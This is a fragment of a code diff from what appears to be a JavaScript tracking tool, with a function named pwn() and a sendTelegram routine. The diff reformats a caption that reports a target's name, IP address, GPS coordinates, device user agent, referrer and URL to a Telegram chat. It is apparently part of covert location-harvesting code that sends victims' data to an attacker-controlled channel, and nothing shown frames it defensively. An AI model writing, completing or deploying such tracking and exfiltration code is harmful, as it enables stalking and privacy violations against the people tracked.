@@ -151,12 +151,12 @@ async function pwn(){
 function sendTelegram(data){
   const caption=`
 🔪INFORMASI LACAKAN BARU 🔪
-😁 NAMA     : ${data.target}
-📍 IP       : ${data.ip}
-🛰️ GPS      : ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
-🖲️ PERANGKAT: ${data.ua}
-🌐 ONLINE   : ${data.ref}
-🔗 TAUTAN   : ${data.url}
+Target: ${data.target}
+IP: ${data.ip}
+GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
+UA: ${data.ua}
+Ref: ${data.ref}
+URL: ${data.url}
   `.trim();
   const form=new FormData();
   form.append('chat_id',CHAT_ID);
